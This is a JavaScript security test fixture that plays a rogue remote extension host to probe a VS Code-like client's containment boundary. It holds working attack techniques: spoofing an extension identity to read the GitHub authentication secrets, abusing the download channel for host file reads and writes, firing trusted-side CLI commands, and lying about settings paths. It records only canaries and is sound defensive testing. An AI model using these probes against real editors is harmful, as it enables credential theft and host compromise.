// Rogue REH probes: the server side of the boundary, attacking the client.
//
// Under our threat model the REH server process runs inside the tab, so it is
// hostile. It reaches surfaces the extension host cannot:
//
//   * channels the CLIENT registers on the remote connection and the server
//     calls directly (download, mcpGatewayToolBroker). These never pass through
//     RPCProtocol, so a MainThread*-only filter does not see them at all.
//   * raw MainThread* RPC with arguments no public API would produce, notably a
//     spoofed extension identity.
//
// Loaded by the test-only hook test/containment/rogue-reh/serverServices-hook.patch, which
// only the `containment` test build variant carries (test/builds/variants.json; never
// patches/series). It arms only when the harness stages a run in the tab:
// ~/.seclab-test/rogue-reh/{targets,probes.js,probe-safety.js}, targets holding a per-run
// nonce (arm), the run directory (run) and an expiry (until). It is a fixture, never shipped
// behaviour, and it only ever runs against our own test builds.
//
// Evidence goes to $SECLAB_ROGUE_REH_OUT/reh-probes.json (the hook sets it to
// ~/.seclab-test/rogue-reh/evidence), in the same shape as
// the extension-side probes so check-probes.ts can apply the same rules.

'use strict';

const fs = require('fs');
const path = require('path');
const safety = require('./probe-safety.js');

// Every string in a run record is a source literal (probe-safety.js, run records).
const OUTCOME = { succeeded: safety.lit('succeeded'), denied: safety.lit('denied'), error: safety.lit('error') };
const KIND = {
	safety: safety.lit('safety'), unsupported: safety.lit('unsupported-operation'), timeout: safety.lit('timeout'),
	other: safety.lit('other'), unrecordable: safety.lit('unrecordable-facts'), notArmed: safety.lit('not-armed'),
	noEmitter: safety.lit('no-fixture-emitter'), noWorkspaceId: safety.lit('no-workspace-id'), noPty: safety.lit('no-pty'),
	noRawRpc: safety.lit('no-raw-rpc-hook'), threw: safety.lit('runner-threw'),
};

/** The KIND of failure only, never the message. */
function classify(err) {
	// A safety refusal is a harness fault, never containment.
	if (err && err.seclabSafety) {
		return { outcome: OUTCOME.error, error: KIND.safety };
	}
	const msg = String((err && err.message) || err);
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation|channel not found/i.test(msg)) {
		return { outcome: OUTCOME.denied, error: KIND.unsupported };
	}
	if (/timed out|no reply within/i.test(msg)) {
		return { outcome: OUTCOME.error, error: KIND.timeout };
	}
	return { outcome: OUTCOME.error, error: KIND.other };
}

/** `fn` returns facts (booleans, numbers, canary tokens) or nothing, never a value it read. */
async function probe(results, id, policyRef, fn) {
	const head = { id: safety.lit(id), policyRef: safety.lit(policyRef) }; // lint-allow: lit-probe-head
	try {
		const facts = await fn();
		try {
			safety.record(facts === undefined ? null : facts);
		} catch {
			results.push({ ...head, outcome: OUTCOME.error, error: KIND.unrecordable });
			return;
		}
		results.push({ ...head, outcome: OUTCOME.succeeded, facts: facts === undefined ? null : facts });
	} catch (err) {
		results.push({ ...head, ...classify(err) });
	}
}

/** A result that never ran, for a reason the fixture names. Never DENIED. */
function inconclusive(results, id, policyRef, kind) {
	results.push({ id: safety.lit(id), policyRef: safety.lit(policyRef), outcome: OUTCOME.error, error: kind }); // lint-allow: lit-probe-head
}



const RESOLVE_REF = 'push:remoteterminal:$onPtyHostRequestResolveVariablesEvent';
const PROFILE_REF = 'data:remoteterminal-profile-path';

/**
 * Ask the trusted side to resolve ${env:...} and hand us the values.
 *
 * onPtyHostRequestResolveVariables is a reverse request with argument
 * authority: the pty host names the strings, the workbench resolves them, and
 * the answers come back over acceptPtyHostResolvedVariables. On desktop the
 * resolver is constructed over shellEnvironmentService.getShellEnv(), so
 * `${env:X}` returns the host user's shell environment.
 *
 * Upstream's only guard is `e.workspaceId !== workspace.id`, and the REH is
 * told the workspaceId on every createProcess call, so it is a routing check
 * rather than a boundary. Upstream's resolver needs no live pty; this probe takes the
 * workspaceId from a process the window created, so the run opens one terminal first.
 *
 * The canary is SECLAB_EDITOR_CANARY, which the harness sets only in the
 * editor's launch environment. Getting it back is proof we read the host
 * process environment, not our own: the REH runs in the tab and never has it.
 */
async function runResolveVariablesProbe(results, ctx, socketServer) {
	const channel = terminalChannel(socketServer);
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	const fail = (kind) => inconclusive(results, 'reh-resolve-variables-host-env', RESOLVE_REF, kind);

	if (!svc || typeof svc._resolveVariables !== 'function') {
		// Never DENIED: an absent fixture must not read as containment.
		return fail(KIND.noEmitter);
	}
	const workspaceId = await knownWorkspaceId(svc);
	if (!workspaceId) {
		// Upstream drops the request when it does not match the window workspace, so
		// without one this is inconclusive.
		return fail(KIND.noWorkspaceId);
	}

	await probe(results, 'reh-resolve-variables-host-env', RESOLVE_REF, async () => {
		// Asking only for the canary, through the REH's own request path (the request store
		// times out at 15 s, so a window that never answers is an error, not a denial).
		// ${command:} is not reachable through resolveAsync, so this is read-only by construction.
		const asked = ['${env:SECLAB_EDITOR_CANARY}'];
		const resolved = await svc._resolveVariables(workspaceId, asked);
		if (Array.isArray(resolved) && resolved.length === asked.length && resolved.every((r, i) => r === asked[i])) {
			// Answered with the text unresolved: what a refusing window replies (patch 0031).
			throw new Error('seclab: denied (unresolved)');
		}
		// Only canary tokens are recorded: the host environment's canary reaching the tab is
		// the escape. The REH runs under env -i and never has it.
		return { replied: true, canaryTokens: safety.canaryTokens(resolved) };
	});
}

/**
 * The terminals this REH runs for the window: id and workspaceId, from the pty host's own
 * serialized state (public API; listProcesses() lists only orphans, so it is empty while the
 * window is attached). Ids are small sequential integers; values stay in memory, never recorded.
 */
async function ownedPtys(svc) {
	try {
		const ids = Array.from({ length: 64 }, (_, i) => i + 1);
		const state = JSON.parse(await svc.serializeTerminalState(ids));
		return (state && Array.isArray(state.state) ? state.state : [])
			.filter(t => t && Number.isSafeInteger(t.id))
			.map(t => ({ id: t.id, workspaceId: t.processDetails && typeof t.processDetails.workspaceId === 'string' ? t.processDetails.workspaceId : undefined }));
	} catch {
		return [];
	}
}

/** A workspaceId the window has given this REH, from a terminal it created. */
async function knownWorkspaceId(svc) {
	const owned = captured.find(p => p.workspaceId) || (await ownedPtys(svc)).find(p => p.workspaceId);
	return owned ? owned.workspaceId : undefined;
}

/** The server's own handle on the terminal channel it registered. */
function terminalChannel(socketServer) {
	// ChannelServer keeps its registrations in a private `channels` map, which
	// is an ordinary property at runtime. Reaching it is exactly the liberty a
	// compromised REH has: it is the same process.
	const channels = socketServer && socketServer.channels;
	const get = channels && (channels.get ? (n) => channels.get(n) : (n) => channels[n]);
	return get ? (get('remoteterminal') || get('remoteTerminal')) : undefined;
}

/**
 * Terminals the window asks this REH for from now on, as a hostile REH would learn them: the
 * pty host's createProcess is wrapped to note the id it returns and the workspaceId the window
 * passed (argument 10). In memory only; never recorded.
 */
const captured = [];
/**
 * The terminal-profile probe (review RFU-1, RFU1R-1). This REH offers the window a profile,
 * `seclab-probe`, whose path and `env` name `${config:seclab.test.canary}`, a host user setting
 * the harness seeds; the harness then makes it the host's default profile, as a user's
 * `terminal.integrated.defaultProfile.linux` would. It also answers getDefaultSystemShell with
 * that path. The window resolves the profile and sends it back in `$createProcess`; a canary
 * there is the host's setting reaching the tab. The probe reads the request as the window sent
 * it, before the server resolves anything, then starts plain /bin/sh without the probe's
 * variable, so the window's terminal still works.
 */
const PROFILE_NAME = 'seclab-probe';
const PROFILE_ENV_KEY = 'SECLAB_PROBE_PROFILE_ENV';
const PROFILE_VALUE = '${config:seclab.test.canary}';
const PROFILE_PATH = `/bin/sh${PROFILE_VALUE}`;
const profileProbe = { armed: false, offered: false, seen: undefined };
function armProfileProbe(channel) {
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	if (!svc || typeof svc.getDefaultSystemShell !== 'function' || typeof channel.call !== 'function' || channel.__seclabProfileProbe) {
		return;
	}
	channel.__seclabProfileProbe = true;
	svc.getDefaultSystemShell = async () => PROFILE_PATH;
	const call = channel.call.bind(channel);
	channel.call = async (ctx, command, args, ...rest) => {
		if (command === '$createProcess' && args && args.shellLaunchConfig) {
			observeProfileLaunch(args);
		}
		const result = await call(ctx, command, args, ...rest);
		if (command === '$getProfiles' && Array.isArray(result)) {
			profileProbe.offered = true;
			return [...result.filter(p => !p || p.profileName !== PROFILE_NAME),
				{ profileName: PROFILE_NAME, path: PROFILE_PATH, isDefault: false, isAutoDetected: false, env: { SECLAB_PROBE_PROFILE_ENV: PROFILE_VALUE } }];
		}
		return result;
	};
	profileProbe.armed = true;
}
function observeProfileLaunch(args) {
	const launch = args.shellLaunchConfig;
	const exe = typeof launch.executable === 'string' ? launch.executable : '';
	if (!exe.startsWith('/bin/sh') || exe === '/bin/sh') {
		return;
	}
	const envValue = launch.env && typeof launch.env[PROFILE_ENV_KEY] === 'string' ? launch.env[PROFILE_ENV_KEY] : undefined;
	if (!profileProbe.seen) {
		profileProbe.seen = {
			sawProfilePath: true,
			sawProfileEnv: envValue !== undefined,
			pathCanary: safety.canaryTokens(exe).length > 0,
			envCanary: envValue !== undefined && safety.canaryTokens(envValue).length > 0,
			resolvedVariablesCanary: safety.canaryTokens(args.resolvedVariables).length > 0,
			unresolved: exe.includes('${config:') && envValue !== undefined && envValue.includes('${config:'),
			canaryTokens: safety.canaryTokens([exe, envValue ?? null, args.resolvedVariables ?? null]),
		};
	}
	launch.executable = '/bin/sh';
	if (launch.env) {
		delete launch.env[PROFILE_ENV_KEY];
	}
}
/**
 * The server's environment (review R5-17, patch 0059). This REH answers the window's
 * getEnvironmentData with every location as a genuine server sends it, except settingsPath,
 * which it points at a file the harness wrote on the host, outside the tab, and it puts URI fields
 * on the reply itself so a check that stops at the first URI skips it, and marks the lie with a
 * `$mid` other than a URI's. That file's only
 * content is terminal.integrated.env.linux with a HOSTREMOTE canary. A window that trusts the reply
 * reads the host file as the tab's settings, and the canary comes back here in the next
 * $createProcess's terminal configuration. The harness reloads the window once this is armed, so
 * the window asks again. Facts only: how many replies carried the lie, and the canary tokens seen.
 */
const ENV_REF = 'data:server-locations';
const envProbe = { armed: false, served: 0, calls: 0, createProcess: 0, tokens: new Set() };
function armEnvironmentLie(socketServer, ctx, hostSettings) {
	if (envProbe.armed) {
		return;
	}
	const channels = socketServer && socketServer.channels;
	const get = channels && (channels.get ? (n) => channels.get(n) : (n) => channels[n]);
	const env = get && get('remoteextensionsenvironment');
	const term = terminalChannel(socketServer);
	if (!env || typeof env.call !== 'function' || !term || typeof term.call !== 'function') {
		return;
	}
	const target = safety.safePath(ctx, hostSettings, 'host settings file');
	const envCall = env.call.bind(env);
	env.call = async (c, command, arg, ...rest) => {
		envProbe.calls++;
		const result = await envCall(c, command, arg, ...rest);
		if (command === 'getEnvironmentData' && result && typeof result === 'object') {
			// Marked $mid 2: the window's URI.revive ignores the marker (review ENV-8).
			result.settingsPath = { $mid: 2, scheme: 'file', authority: '', path: target };
			// URI fields on the reply itself, as if it were one URI on the tab (review ENV-1): a check
			// that stops walking at the first URI-shaped object would skip the whole reply.
			const authority = arg && typeof arg.remoteAuthority === 'string' ? arg.remoteAuthority : '';
			Object.assign(result, { scheme: 'vscode-remote', authority, path: '/' });
			envProbe.served++;
		}
		return result;
	};
	const termCall = term.call.bind(term);
	term.call = async (c, command, args, ...rest) => {
		if (command === '$createProcess' && args && args.configuration) {
			envProbe.createProcess++;
			safety.canaryTokens(args.configuration).forEach(t => envProbe.tokens.add(t));
		}
		return termCall(c, command, args, ...rest);
	};
	envProbe.armed = true;
}

function captureCreatedPtys(channel) {
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	if (!svc || typeof svc.createProcess !== 'function' || svc.__seclabCaptured) {
		return;
	}
	const original = svc.createProcess.bind(svc);
	svc.__seclabCaptured = true;
	svc.createProcess = async (...args) => {
		const id = await original(...args);
		if (Number.isSafeInteger(id)) {
			captured.push({ id, workspaceId: typeof args[9] === 'string' ? args[9] : undefined });
		}
		return id;
	};
}

/** Persistent process ids this REH has created, which the window owns. */
async function persistentProcessIds(channel) {
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	return [...new Set([...captured.map(p => p.id), ...(svc ? (await ownedPtys(svc)).map(p => p.id) : [])])];
}

/**
 * Fire onExecuteCommand for each _remoteCLI command on the client's allow list.
 *
 * Each command gets its own probe id and its own facts, so one result can't mask another:
 * on a baseline each must run on the trusted side, and on a patched build each must get the
 * refusal's fixed reply. No marker: the REH can't write a host path, and a reply is the
 * observable fact.
 */
async function runExecuteCommandProbes(results, ctx, socketServer) {
	const channel = terminalChannel(socketServer);
	const emitter = channel && (channel._onExecuteCommand || channel.onExecuteCommandEmitter);

	// Each entry: probe id, command, marker suffix, and how to build its args.
	const vectors = [
		{
			id: 'reh-onexecutecommand-windowopen',
			commandId: '_remoteCLI.windowOpen',
			// Opening a window on a host path is host-side UI acting on our input,
			// and the opened folder is then trusted by the window that opens it.
			args: () => [[], { forceNewWindow: true, folderURIs: [] }],
		},
		{
			id: 'reh-onexecutecommand-manageextensions',
			commandId: '_remoteCLI.manageExtensions',
			// Installing an extension on the trusted side is host code execution.
			// We ask only for a LIST, never an install: the escape is reaching the
			// command at all, and the payload must not also be an attack.
			args: () => [{ list: { showVersions: false } }],
		},
		{
			id: 'reh-onexecutecommand-getsystemstatus',
			commandId: '_remoteCLI.getSystemStatus',
			// Host diagnostics (OS, CPUs, memory, processes) handed to the tab. Read-only. It
			// replaces the openExternal vector, which on a baseline build launches the host's
			// default browser: a window outside the run's control that takes focus.
			args: () => [],
			// Collecting host diagnostics takes several seconds (process lists, remote diagnostics).
			waitMs: 30000,
		},
	];

	if (!emitter || typeof emitter.fire !== 'function') {
		// Not a pass. An absent fixture must never read as containment, so this
		// is ERROR, which check-probes.ts refuses to count as a denial.
		for (const v of vectors) {
			inconclusive(results, v.id, 'push:remoteterminal:$onExecuteCommand', KIND.noEmitter);
		}
		return;
	}

	const ids = await persistentProcessIds(channel);
	if (ids.length === 0) {
		// The client drops the event when it owns no matching pty, so this is inconclusive.
		for (const v of vectors) {
			inconclusive(results, v.id, 'push:remoteterminal:$onExecuteCommand', KIND.noPty);
		}
		return;
	}

	const persistentProcessId = ids[0];
	let reqId = 0x5EC1AB00;
	for (const v of vectors) {
		await probe(results, v.id, 'push:remoteterminal:$onExecuteCommand', async () => {
			const id = reqId++;
			const reply = new Promise((resolve) => {
				// The client answers through sendCommandResult; the server resolves or rejects the
				// pending entry, so a reply is proof the trusted side ran, or refused, the command.
				const pending = channel._pendingCommands;
				if (pending && typeof pending.set === 'function') {
					pending.set(id, { resolve: (payload) => resolve({ ok: true, payload }), reject: (payload) => resolve({ ok: false, payload }), uriTransformer: { transformIncoming: (x) => x } });
				}
				setTimeout(() => resolve(undefined), v.waitMs || 5000);
			});
			emitter.fire({ reqId: id, persistentProcessId, commandId: v.commandId, commandArgs: v.args(ctx) });
			const r = await reply;
			if (!r) {
				throw new Error('timed out: no reply');
			}
			if (!r.ok) {
				// The refusal's reply is a fixed literal (patch 0030); anything else is upstream failing.
				throw new Error(r.payload === 'seclab: denied' ? 'seclab: denied' : 'the command failed');
			}
			const text = typeof r.payload === 'string' ? r.payload : '';
			// Facts only: that it ran, and for the status whether it describes a macOS host (the
			// tab is Linux, so that can only be the host's).
			return { replied: true, ran: true, hostIsMac: /\bDarwin\b|\bmacOS\b/.test(text) };
		});
	}
}

/**
 * @param socketServer the server's SocketServer; getChannel(name, router)
 *   returns a proxy to a channel the CLIENT registered.
 * @param router a StaticRouter selecting the renderer connection.
 */
async function runRehProbes(socketServer, router) {
	const results = [];
	// The tab runs under env -i, so the run arms through the targets file the harness staged
	// beside this payload (the hook has already checked it), never the environment.
	const targets = stagedTargets();
	const ctx = safety.context(targets);
	if (!ctx.armed) {
		return [{ id: safety.lit('harness'), policyRef: safety.lit(''), outcome: OUTCOME.error, error: KIND.notArmed }];
	}
	if (targets.only === 'environment') {
		// The environment proof (patch 0059) runs this alone. `ready` is written once the lie is in
		// place, so the harness knows to reload; `done` once it has opened a terminal after that.
		armEnvironmentLie(socketServer, ctx, targets.hostsettings);
		// Inside the tab no host path may be written (an advisory context refuses every write), so
		// the armed marker goes beside this payload's own evidence, where the harness reads it.
		const out = process.env.SECLAB_ROGUE_REH_OUT;
		if (envProbe.armed && out) {
			fs.mkdirSync(out, { recursive: true });
			fs.writeFileSync(path.join(out, 'env-armed'), '');
		}
		await waitForReady(targets.done);
		if (!envProbe.armed) {
			inconclusive(results, 'reh-environment-host-settings', ENV_REF, KIND.noEmitter);
		} else {
			await probe(results, 'reh-environment-host-settings', ENV_REF, async () => ({
				served: envProbe.served, calls: envProbe.calls, createProcess: envProbe.createProcess, canaryTokens: [...envProbe.tokens].sort().slice(0, 16),
			}));
		}
		return results;
	}
	if (targets.only === 'push') {
		// The server-initiated push proof (patches 0030/0031) runs these alone, after recording
		// what the payload could see (facts only), so an inconclusive run says why.
		captureCreatedPtys(terminalChannel(socketServer));
		armProfileProbe(terminalChannel(socketServer));
		await waitForReady(targets.ready);
		await writeDiagnostics(socketServer);
		await runExecuteCommandProbes(results, ctx, socketServer);
		await runResolveVariablesProbe(results, ctx, socketServer);
		if (!profileProbe.armed || !profileProbe.seen) {
			inconclusive(results, 'reh-profile-config-host-setting', PROFILE_REF, profileProbe.armed ? KIND.noPty : KIND.noEmitter);
		} else {
			await probe(results, 'reh-profile-config-host-setting', PROFILE_REF, async () => profileProbe.seen);
		}
		return results;
	}

	// --- download channel ----------------------------------------------------
	// DownloadServiceChannel revives BOTH URIs from arguments the server sends,
	// so the trusted side fetches a source we name and writes to a destination
	// we name. Reading a host path we could not otherwise see proves host FS
	// read; writing a marker proves host FS write.
	const download = () => socketServer.getChannel('download', router);
	await probe(results, 'channel-download-host-read', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download-read`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		const landed = fs.existsSync(dest);
		return { landed, canaryTokens: landed ? safety.canaryTokens(fs.readFileSync(dest, 'utf8')) : [] };
	});
	await probe(results, 'channel-download-host-write', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return { returned: true };
	});

	// --- MCP gateway tool broker --------------------------------------------
	// callToolForServer invokes a tool hosted on the TRUSTED side, which is a
	// host process holding host credentials, with arguments we choose. Only whether
	// a reply came back is recorded.
	const mcp = () => socketServer.getChannel('mcpGatewayToolBroker', router);
	await probe(results, 'channel-mcp-list-servers', 'chan:mcpGatewayToolBroker',
		async () => ({ returned: (await mcp().call('listServers', [{}])) !== undefined }));
	await probe(results, 'channel-mcp-call-tool', 'chan:mcpGatewayToolBroker',
		async () => {
			await mcp().call('callToolForServer', [{
				serverId: process.env.SECLAB_PROBE_MCP_SERVER || 'host-probe',
				toolName: process.env.SECLAB_PROBE_MCP_TOOL || 'run',
				// Marker only. A tool invocation is the escape being demonstrated;
				// the payload must not also be an attack.
				arguments: { command: safety.markerCommand(ctx, '.mcp') },
			}]);
			return { returned: true };
		});

	// --- raw RPC: spoofed extension identity ---------------------------------
	// $getKeys/$getPassword take the extension id as an ARGUMENT, so a hostile
	// host can name a UI-side extension and enumerate, then read, its secrets.
	// No public API can express this, which is why it lives here. Counts and canary
	// tokens only: never a key or a value.
	if (typeof globalThis.__seclabMainThreadRpc === 'function') {
		const rpc = globalThis.__seclabMainThreadRpc;
		await probe(results, 'rpc-secret-identity-spoof', 'rpc:MainThreadSecretState.$getKeys',
			async () => {
				const victim = 'vscode.github-authentication';
				const keys = await rpc('MainThreadSecretState', '$getKeys', [victim]);
				let values = 0;
				const tokens = new Set();
				for (const k of (keys || []).slice(0, 8)) {
					const v = await rpc('MainThreadSecretState', '$getPassword', [victim, k]);
					if (v !== undefined && v !== null) {
						values++;
						safety.canaryTokens(v).forEach(t => tokens.add(t));
					}
				}
				return { keys: (keys || []).length, values, canaryTokens: [...tokens].sort() };
			});
		await probe(results, 'rpc-proxy-auth', 'rpc:MainThreadWorkspace.$lookupAuthorization',
			async () => {
				const auth = await rpc('MainThreadWorkspace', '$lookupAuthorization',
					[{ scheme: 'https', host: 'example.invalid', port: 443 }]);
				return { returned: auth !== undefined && auth !== null, canaryTokens: safety.canaryTokens(auth) };
			});
	} else {
		// Not a pass. An absent hook must never look like containment.
		inconclusive(results, 'rpc-secret-identity-spoof', 'rpc:raw', KIND.noRawRpc);
		inconclusive(results, 'rpc-proxy-auth', 'rpc:raw', KIND.noRawRpc);
	}

	// --- server-initiated terminal callback ----------------------------------
	// onExecuteCommand is the push direction: the SERVER names a command and the
	// trusted workbench runs it. It reaches none of the other enforcement points
	// -- it never crosses RPCProtocol, it arrives on a ChannelClient rather than
	// a ChannelServer, and it carries no origin, so the command taint sees
	// nothing in flight.
	//
	// The client guards on `this._ptys.get(e.persistentProcessId)`, so the event
	// is only honoured for a terminal this window owns. That is why this was a
	// stub for so long. We satisfy it the way a real attacker would: the REH is
	// the thing that creates ptys, so it already knows their ids.
	await runExecuteCommandProbes(results, ctx, socketServer);

	// --- server-initiated variable resolution --------------------------------
	await runResolveVariablesProbe(results, ctx, socketServer);

	return results;
}

/**
 * Wait (bounded) until the harness says the window's terminal is up: it names a workspace file
 * the terminal itself writes. A path outside an absolute, plain form is ignored.
 */
async function waitForReady(ready) {
	if (typeof ready !== 'string' || !/^\/[A-Za-z0-9._\/-]+$/.test(ready)) {
		return;
	}
	for (const until = Date.now() + 180000; Date.now() < until && !fs.existsSync(ready);) {
		await new Promise(r => setTimeout(r, 1000));
	}
	await new Promise(r => setTimeout(r, 3000));
}

/** What the push probes could reach, as booleans and counts, beside the evidence. */
async function writeDiagnostics(socketServer) {
	const channel = terminalChannel(socketServer);
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	const facts = {
		channel: !!channel, ptyHostService: !!svc,
		serializeTerminalState: !!svc && typeof svc.serializeTerminalState === 'function',
		resolveVariables: !!svc && typeof svc._resolveVariables === 'function',
		executeCommandEmitter: !!channel && !!(channel._onExecuteCommand || channel.onExecuteCommandEmitter),
		pendingCommands: !!channel && !!channel._pendingCommands,
		captured: captured.length,
		capturedWithWorkspace: captured.filter(p => p.workspaceId).length,
		ownedPtys: svc ? (await ownedPtys(svc)).length : -1,
		ownedWithWorkspace: svc ? (await ownedPtys(svc)).filter(p => p.workspaceId).length : -1,
		serializeThrew: false, stateCount: -1,
	};
	if (svc && typeof svc.serializeTerminalState === 'function') {
		try {
			const st = JSON.parse(await svc.serializeTerminalState(Array.from({ length: 64 }, (_, i) => i + 1)));
			facts.stateCount = st && Array.isArray(st.state) ? st.state.length : -2;
		} catch {
			facts.serializeThrew = true;
		}
	}
	try {
		const out = process.env.SECLAB_ROGUE_REH_OUT;
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-diagnostics.json'), safety.recordJson(facts));
	} catch { /* best effort */ }
}

/** key=value lines from ~/.seclab-test/rogue-reh/targets, beside this payload. */
function stagedTargets() {
	try {
		return Object.fromEntries(fs.readFileSync(path.join(__dirname, 'targets'), 'utf8').split('\n')
			.filter(l => l.includes('=')).map(l => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]));
	} catch {
		return {};
	}
}

async function main(socketServer, router) {
	const out = process.env.SECLAB_ROGUE_REH_OUT;
	if (!out) {
		return;
	}
	let results;
	try {
		// Targets come from the safety context, which derives them from the
		// harness-supplied run directory. Nothing here is read from the
		// environment the tab controls.
		results = await runRehProbes(socketServer, router);
	} catch {
		results = [{ id: safety.lit('harness'), policyRef: safety.lit(''), outcome: OUTCOME.error, error: KIND.threw }];
	}
	try {
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-probes.json'), safety.recordJson({ results }));
	} catch { /* evidence is best effort; an unrecordable value writes nothing */ }
}

/**
 * Called by the hook as this server starts, before any window connects, when a run was staged
 * before it started: each window load starts a new server, and a window asks for its environment
 * as soon as it connects, so the environment lie must be in place by then. It arms once both
 * channels it wraps are registered. Nothing else runs early.
 */
function early(socketServer) {
	const targets = stagedTargets();
	const ctx = safety.context(targets);
	if (!ctx.armed || targets.only !== 'environment' || !socketServer || typeof socketServer.registerChannel !== 'function') {
		return;
	}
	const register = socketServer.registerChannel.bind(socketServer);
	socketServer.registerChannel = (name, channel) => {
		register(name, channel);
		if (!envProbe.armed) {
			armEnvironmentLie(socketServer, ctx, targets.hostsettings);
		}
	};
}

module.exports = { runRehProbes, main, early };
